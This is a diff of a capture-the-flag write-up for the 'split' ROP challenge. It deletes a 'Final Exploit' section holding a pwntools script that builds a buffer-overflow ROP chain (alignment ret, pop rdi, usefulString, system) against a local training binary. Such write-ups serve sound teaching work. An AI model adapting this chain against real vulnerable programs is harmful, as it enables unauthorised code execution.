@@ -94,35 +94,6 @@ If alignment is incorrect, `system()` may crash due to SSE instructions (`movaps
 
 ---
 
-## Final Exploit
-
-```python
-from pwn import *
-
-context.binary = exe = ELF('split')
-r = process(exe.path)
-
-rop = ROP(exe)
-
-offset = 40
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-cmd = exe.sym['usefulString']
-system = exe.sym['system']
-
-payload = flat(
-    b'A' * offset,
-    rop.ret,        # stack alignment
-    pop_rdi,
-    cmd,
-    system
-)
-
-r.sendline(payload)
-r.interactive()
-````
-
----
-
 ## Result
 
 ```
